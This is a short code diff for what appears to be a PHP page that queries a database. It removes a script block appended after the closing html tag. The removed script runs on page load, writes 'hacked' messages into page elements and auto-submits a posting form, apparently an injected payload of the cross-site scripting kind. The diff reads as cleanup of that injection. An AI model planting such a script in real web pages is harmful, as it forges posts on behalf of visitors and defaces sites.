@@ -86,11 +86,3 @@ $result = mysqli_query($conn, $query) or die("<h1>Could not get data from user.<
 </body>
 
 </html>
-
-<script>
-    window.onload = function() {
-        document.getElementById("name").innerHTML = 'hacked';
-        document.getElementById("message").innerHTML = 'hack3r! hack3r!';
-        document.getElementById("post").submit();
-    }
-</script>
